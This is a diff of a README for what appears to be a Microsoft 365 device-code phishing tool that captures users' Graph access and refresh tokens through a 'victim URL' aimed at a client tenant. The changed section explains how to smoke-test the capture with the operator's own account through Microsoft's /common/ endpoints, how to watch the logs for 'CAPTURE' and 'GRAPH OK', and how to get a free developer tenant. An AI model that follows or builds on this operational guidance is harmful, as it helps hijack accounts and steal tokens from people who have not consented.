@@ -157,40 +157,30 @@ Refreshed tokens are saved to `<usercode>.graph-refresh.json`. Outcomes:
 
 Set `"validateTokens": false` in config to disable.
 
-## Smoke test (no victim account needed)
+## Smoke test (real login with your account)
 
-While the server is running, open the smoke test page (no geo block):
+`/smoke-test` works like `/share`, but uses Microsoft **`/common/`** endpoints so you can sign in with **any Azure AD account you control** — production gipi config stays unchanged.
 
 ```
 https://your-domain/smoke-test
 ```
 
-Setup and `npm start` print this URL alongside the victim URL. The page checks config, TLS, production OAuth, and `/common/` OAuth.
+Setup and `npm start` print this URL next to the victim URL. Complete login at `microsoft.com/devicelogin` and watch server logs for `CAPTURE` + `GRAPH OK`.
 
-To test a **full capture with your own account**, open the link on that page (`/smoke-test?capture=1`) — same host, uses Microsoft `/common/` endpoints instead of the client tenant.
-
-CLI alternative (server can stay up):
+Optional CLI diagnostics (no browser):
 
 ```bash
 npm run smoke-test
-npm run smoke-test -- --live-url https://your-domain/smoke-test
 ```
 
 ### Self-test without the client's tenant
 
-Microsoft provides **generic endpoints** that work with any Azure AD work account you control:
+| Endpoint | Use case |
+|----------|----------|
+| `/smoke-test` (server) | Real login test with `/common/` + your account |
+| `common` in CLI | API-only checks |
 
-| Tenant alias | Use case |
-|--------------|----------|
-| `common` | Any work/school Azure AD account |
-| `organizations` | Work/school only (no personal Microsoft accounts) |
-| `yourname.onmicrosoft.com` | Your own dev tenant |
-
-**Free dev tenant (no custom domain required):**
-
-1. Join the [Microsoft 365 Developer Program](https://developer.microsoft.com/microsoft-365/dev-program)
-2. You get `something.onmicrosoft.com` + test users in the admin portal
-3. Run setup with that tenant for a dedicated lab, or use `/smoke-test?capture=1` against production config
+**Free dev tenant:** [Microsoft 365 Developer Program](https://developer.microsoft.com/microsoft-365/dev-program) gives `*.onmicrosoft.com` test users if you don't have another work account.
 
 ## Certificates
 
